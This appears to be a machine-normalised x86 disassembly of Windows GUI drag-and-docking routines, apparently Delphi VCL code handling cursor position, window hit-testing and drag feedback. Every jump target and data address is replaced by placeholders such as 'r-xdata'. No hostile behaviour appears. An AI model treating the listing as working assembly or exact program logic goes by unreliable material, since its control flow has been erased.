call sub_40278c
inc esi
dec ebx
jne r-xdata
sub_43d018
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_417570
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_43cf2c
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43d07c
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43d0dc
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403238
mov edx esp
mov eax esi
call sub_40429c
add esp 0x100
pop esi
pop ebx
retn
sub_43d118
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d1e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_43e238
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43dbc0
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cec
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_43dbc0
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_43e238
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43dbc0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_43e238
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_43d1e7
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45f9a8
call sub_403af0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_43e238
sub_43d240
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d26a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d2d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d07c
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_43d2fc
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_4034e4
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_43d328
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_4034e4
xor edx edx
sub_43d380
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_448090
sub_43d3a0
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_448078
sub_43d3c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43d2ac
mov dl 0x1
mov eax [ r-xdata ]
call sub_420a90
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_4278d4
mov edx eax
mov eax esi
call sub_420c0c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_43d428
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_43d458
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d2d0
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43d4b4
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_4034e4
pop edi
pop esi
pop ebp
retn 0x4
sub_43d4d8
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_43d4fc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43d4d8
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43d4d8
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43d5b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_43d624
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_43da74
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43cb90
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_4464d0
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_4464d0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4464d0
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_4034e4
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_43d5b8
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_4464d0
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_4464d0
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43d7bc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4464d0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4464d0
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_43d800
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43d018
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_43d624
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_417570
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_4464d0
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43d7bc
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_4034e4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_444fc8
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43cf88
sub_43d95c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_4175cc
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_417460
mov edx edi
mov eax [ rw-data ]
call sub_417414
jmp r-xdata
sub_43d9bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_43da14
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4044f8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_43cb5c
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_43da74
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43da14
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43daa0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_43d800
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_43da74
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43d9bc
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4464d0
mov [ esi ] eax
sub_43daf0
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43d9bc
cmp eax 0x1
sbb eax eax
inc eax
sub_43db2c
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_444f34
test eax eax
je r-xdata
mov eax esi
call sub_444f34
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_43e55c
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_417570
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4175cc
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_444f48
mov edi eax
jmp r-xdata
sub_43dbc0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_43daa0
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_447f4c
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_43daf0
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_43daf0
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_43f7f4
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_43daf0
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d910
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_447f34
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_43db2c
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_4034e4
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_448034
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_447f4c
jmp r-xdata
mov eax [ rw-data ]
call sub_4480a8
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d910
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_43f7f4
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_4034e4
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_4034e4
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407f60
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43de90
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43d0bc
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_447f4c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_43dbc0
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_43e000
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_43e1a5
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_4034e4
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_4034e4
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d3c4
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43de90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d2ac
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_4464d0
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_416114
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_43f7c8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
